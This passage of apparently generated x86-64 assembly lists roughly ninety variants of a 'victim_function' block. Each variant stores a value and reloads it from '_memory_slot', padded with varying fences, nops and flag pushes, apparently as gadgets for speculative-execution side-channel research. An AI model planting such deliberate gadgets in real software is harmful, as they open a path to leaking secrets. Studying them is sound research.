	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1029
.Lvictim_function_win0_var1029:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1030
.Lvictim_function_win0_var1030:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1031
.Lvictim_function_win0_var1031:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1032
.Lvictim_function_win0_var1032:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1033
.Lvictim_function_win0_var1033:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1034
.Lvictim_function_win0_var1034:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1035
.Lvictim_function_win0_var1035:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1036
.Lvictim_function_win0_var1036:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1037
.Lvictim_function_win0_var1037:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1038
.Lvictim_function_win0_var1038:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1039
.Lvictim_function_win0_var1039:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1040
.Lvictim_function_win0_var1040:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1041
.Lvictim_function_win0_var1041:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1042
.Lvictim_function_win0_var1042:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1043
.Lvictim_function_win0_var1043:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1044
.Lvictim_function_win0_var1044:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1045
.Lvictim_function_win0_var1045:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1046
.Lvictim_function_win0_var1046:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1047
.Lvictim_function_win0_var1047:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1048
.Lvictim_function_win0_var1048:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1049
.Lvictim_function_win0_var1049:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1050
.Lvictim_function_win0_var1050:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1051
.Lvictim_function_win0_var1051:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1052
.Lvictim_function_win0_var1052:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1053
.Lvictim_function_win0_var1053:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1054
.Lvictim_function_win0_var1054:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1055
.Lvictim_function_win0_var1055:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1056
.Lvictim_function_win0_var1056:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1057
.Lvictim_function_win0_var1057:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1058
.Lvictim_function_win0_var1058:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1059
.Lvictim_function_win0_var1059:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1060
.Lvictim_function_win0_var1060:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1061
.Lvictim_function_win0_var1061:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1062
.Lvictim_function_win0_var1062:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1063
.Lvictim_function_win0_var1063:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1064
.Lvictim_function_win0_var1064:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1065
.Lvictim_function_win0_var1065:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1066
.Lvictim_function_win0_var1066:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1067
.Lvictim_function_win0_var1067:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1068
.Lvictim_function_win0_var1068:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1069
.Lvictim_function_win0_var1069:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1070
.Lvictim_function_win0_var1070:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1071
.Lvictim_function_win0_var1071:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1072
.Lvictim_function_win0_var1072:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1073
.Lvictim_function_win0_var1073:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1074
.Lvictim_function_win0_var1074:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1075
.Lvictim_function_win0_var1075:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1076
.Lvictim_function_win0_var1076:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1077
.Lvictim_function_win0_var1077:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1078
.Lvictim_function_win0_var1078:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1079
.Lvictim_function_win0_var1079:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1080
.Lvictim_function_win0_var1080:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1081
.Lvictim_function_win0_var1081:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1082
.Lvictim_function_win0_var1082:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1083
.Lvictim_function_win0_var1083:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1084
.Lvictim_function_win0_var1084:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1085
.Lvictim_function_win0_var1085:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1086
.Lvictim_function_win0_var1086:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1087
.Lvictim_function_win0_var1087:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1088
.Lvictim_function_win0_var1088:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1089
.Lvictim_function_win0_var1089:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1090
.Lvictim_function_win0_var1090:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1091
.Lvictim_function_win0_var1091:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1092
.Lvictim_function_win0_var1092:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1093
.Lvictim_function_win0_var1093:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1094
.Lvictim_function_win0_var1094:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1095
.Lvictim_function_win0_var1095:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1096
.Lvictim_function_win0_var1096:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1097
.Lvictim_function_win0_var1097:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1098
.Lvictim_function_win0_var1098:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1099
.Lvictim_function_win0_var1099:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1100
.Lvictim_function_win0_var1100:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1101
.Lvictim_function_win0_var1101:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1102
.Lvictim_function_win0_var1102:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1103
.Lvictim_function_win0_var1103:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1104
.Lvictim_function_win0_var1104:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1105
.Lvictim_function_win0_var1105:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1106
.Lvictim_function_win0_var1106:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1107
.Lvictim_function_win0_var1107:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1108
.Lvictim_function_win0_var1108:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1109
.Lvictim_function_win0_var1109:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1110
.Lvictim_function_win0_var1110:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1111
.Lvictim_function_win0_var1111:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1112
.Lvictim_function_win0_var1112:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1113
.Lvictim_function_win0_var1113:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1114
.Lvictim_function_win0_var1114:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1115
.Lvictim_function_win0_var1115:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1116
.Lvictim_function_win0_var1116:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1117
.Lvictim_function_win0_var1117:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1118
.Lvictim_function_win0_var1118:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1119
.Lvictim_function_win0_var1119:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1120
.Lvictim_function_win0_var1120:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1121
.Lvictim_function_win0_var1121:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1122
.Lvictim_function_win0_var1122:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1123
